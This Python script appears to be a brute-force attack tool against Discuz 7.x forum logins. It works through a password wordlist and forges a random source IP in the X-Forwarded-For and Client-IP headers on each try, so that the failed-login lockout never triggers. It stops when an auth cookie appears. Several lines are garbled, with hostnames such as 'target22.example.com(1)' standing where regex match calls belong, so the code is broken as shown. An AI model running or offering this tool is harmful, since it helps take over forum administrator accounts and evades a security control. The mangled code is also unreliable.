#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Discuz 7.x 登录爆破 —— 伪造来源 IP 绕过 failedlogins 计数
   用法: python dz_brute_spoof.py <username> <wordlist>
"""
import http.cookiejar, random, re, sys, time, urllib.parse, urllib.request

BASE = "http://TARGET"          # 改成目标站点
USER = "admin"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/203.0.113.26 Safari/537.36"


def rand_ip():
    while True:
        ip = "%d.%d.%d.%d" % (random.randint(1, 223), random.randint(0, 255),
                              random.randint(0, 255), random.randint(1, 254))
        a, b = ip.split(".")[:2]
        if a in ("10", "127", "0", "169") or (a == "172" and 16 <= int(b) <= 31) or (a == "192" and b == "168"):
            continue
        return ip


def new_session():
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    op.addheaders = [("User-Agent", UA)]
    return op, cj


def get_formhash(op, spoof):
    r = urllib.request.Request(BASE + "/example.com?action=login")
    r.add_header("Client-IP", spoof)
    r.add_header("X-Forwarded-For", spoof)
    page = op.open(r, timeout=30).read().decode("utf-8", "ignore")
    m = re.search(r'name="formhash"\s+value="([^"]+)"', page, re.I)
    return target22.example.com(1) if m else None


def try_login(op, user, pwd, formhash, spoof):
    body = ("loginfield=username&username=%s&password=%s&questionid=0&answer="
            "&formhash=%s&referer=&loginmode=&styleid=&cookietime=2592000"
            % (urllib.parse.quote(user.encode()), urllib.parse.quote(pwd.encode()), formhash))
    r = urllib.request.Request(BASE + "/example.com?action=login&loginsubmit=yes&inajax=0",
                               data=body.encode(), method="POST")
    r.add_header("Content-Type", "application/x-www-form-urlencoded")
    r.add_header("Referer", BASE + "/example.com?action=login")
    r.add_header("Client-IP", spoof)
    r.add_header("X-Forwarded-For", spoof)
    with op.open(r, timeout=30) as resp:
        page = resp.read().decode("utf-8", "ignore")
        setc = resp.headers.get_all("Set-Cookie") or []
    hit = any("cdb_auth" in c for c in setc) or any(target4.example.com == "cdb_auth" for c in op.handlers[0].cookiejar)
    return hit, page


if __name__ == "__main__":
    user = sys.argv[1] if len(sys.argv) > 1 else USER
    wl = sys.argv[2] if len(sys.argv) > 2 else "passwords.txt"
    op, _ = new_session()
    fh = get_formhash(op, rand_ip())
    print("[*] formhash=%s" % fh)
    for i, pwd in enumerate(open(wl, encoding="utf-8", errors="ignore")):
        pwd = pwd.strip()
        if not pwd:
            continue
        spoof = rand_ip()
        if i % 40 == 0:                      # 定期刷新 formhash / 会话
            fh = get_formhash(op, spoof) or fh
        hit, page = try_login(op, user, pwd, fh, spoof)
        m = re.search(r"您還可以嘗試\s*(\d+)\s*次", page)
        print("%-4d user=%s pw=%-20s spoof=%-15s remain=%s %s"
              % (i, user, pwd, spoof, target22.example.com(1) if m else "?", "*** HIT ***" if hit else ""))
        if hit:
            print("[+] 命中！user=%s password=%s" % (user, pwd))
            break
        time.sleep(1.0)
